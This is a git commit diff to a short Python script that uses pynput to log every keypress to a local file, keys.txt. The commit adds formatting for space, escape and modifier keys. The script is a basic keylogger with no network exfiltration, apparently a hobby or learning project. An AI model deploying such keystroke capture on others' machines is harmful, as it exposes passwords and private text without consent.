7a40c5b862a4f1b5c37193bf3b2b7567f45d8575
Ben-Yeoh <ben.yeoh@outlook.com>
2021-03-26 22:42:49 +1100

    Add formatting to modifier keys

--- script.py
+++ script.py
@@ -2,33 +2,42 @@ from pynput import keyboard
 
 keys = []
 
+
 def strip_apostrophe(key):
     return str(key).replace("'", "")
 
+
 def format_key(key):
-    return strip_apostrophe(key) + " "
+    key = strip_apostrophe(key)
+    if (key == "Key.space"):
+        return " "
+    elif (key == "Key.esc"):
+        return ""
+    # If the input is a modifier key (e.g. Shift, Alt) surrond it with brackets.
+    elif (len(key) > 1):
+        return f"[{key}]"
+    return key
+
 
 def write_to_file(keys):
     with open('keys.txt', 'w') as file:
         for key in keys:
             file.write(format_key(key))
 
+
 # Boilerplate from pynput docs
 # https://pynput.readthedocs.io/en/latest/keyboard.html#monitoring-the-keyboard
+
 def on_press(key):
     keys.append(key)
     write_to_file(keys)
 
-    # try:
-    #     print('alphanumeric key {0} pressed'.format(key.char))
-    # except AttributeError:
-    #     print('special key {0} pressed'.format(key))
 
 def on_release(key):
-    print('{0} released'.format(key))
     if key == keyboard.Key.esc:
         # Stop listener
         return False
 
-with keyboard.Listener(on_press = on_press, on_release = on_release) as listener:    
+
+with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
     listener.join()
